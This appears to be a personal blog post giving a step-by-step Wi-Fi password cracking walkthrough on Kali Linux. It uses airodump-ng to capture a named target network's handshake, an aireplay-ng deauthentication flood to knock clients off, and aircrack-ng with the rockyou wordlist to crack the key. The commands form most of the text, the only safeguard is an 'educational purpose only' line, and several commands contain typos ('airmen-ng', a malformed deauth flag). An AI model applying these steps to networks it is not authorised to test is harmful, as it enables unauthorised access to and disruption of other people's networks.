---
title: Wifi Hacking
author: Radeel Ahmad
pubDatetime: 2024-05-12T12:22:23Z
slug: Hacking Wifi
featured: false
draft: false
tags:
  - hacking
  - wireless-hacking
ogImage: https://res.cloudinary.com/noezectz/v1663745737/astro-paper/astropaper-x-forestry-og_kqfwp0.png
description:
  step-by-step method to hack WIFI using a network adapter.
---

## Requirements
- Kali Linux Machine (attacking machine)
- Network Adapter

## Let’s Start…..

The network adapter I am using for this attack demo is **Alpha’s AWUS036H**.

![image1](Images/WH-1.jpg)

After connecting the network adapter, open the Kali Linux machine and write the followingcommand on the terminal.

```code
iwconfig
```

![image1](Images/WH-11.png)

When we connect the adapter, you’ll see the wlan0 interface on your terminal screens. To change the mode to `Monitor Mode`, use the following command.

```code
sudo airmen-ng start wlan0 
```

![image1](Images/WH-3.png)

Again, use the command mentioned below to verify the monitor mode.

```code
iwconfig
```

![image1](Images/WH-4.png)

As you can see, the mode has been changed. Now, use the airodump-ng tool to capture wireless network traffic on the specified interface.

```code
sudo airodump-ng wlan0
```

![image1](Images/WH-5.png)

It will display information about nearby **WiFi Networks**. Our intended interface is `Alvish Bhaii`. Then, copy the `BSSID`.

The Following command tells us how many devices are connected tothis Network interface.

```code
sudo airodump-ng wlan0 -d <mac-address>
```

![image1](Images/WH-6.png)

Remember, WiFi Networks always occupy a limited radius of the area. So, you should be within that radius to discover the WiFi network. The next step is to capture the handshake, using the **death attack**.

```code
sudo airodump-ng -w <filename> –c 1 --bssid <target-mac> wlan0
```

![image1](Images/WH-7.png)

In this attack, we save the handshake in a `.pcap` file. The next step is the death attack: We open another terminal and type the following command.

```code
sudo aireplay-ng -–deauth 0 -a <target-mac> wlan0
```

![image1](Images/WH-8.png)

If a disconnected client tries to connect with the wifi, they generate a four-way handshake.

**What is a four-way handshake?**
A four-way handshake is a message exchange between an access point and the client device.

![image1](Images/WH-9.png)

Now, you see that it captures the handshake. Type in the ls command to see the file.

![image1](Images/WH-10.png)

In our attack method, we are going to crack the password in our test-01.cap in encrypted form. The cracking is totally offline; we don’t need an internet connection or Wi-Fi adapter for it. We’ll use their crack toolto crack the password.

```code
aircrack-ng <filename.cap> -w /usr/share/wordlists/rockyou.txt
```

![image1](Images/WH-11.png)

**You see that the key is found and cracked Successfully.**

Thank You for reading this blog. I hope that you have found this information provided to be valuable and helpful. Use it for educational purpose only…. 🙂
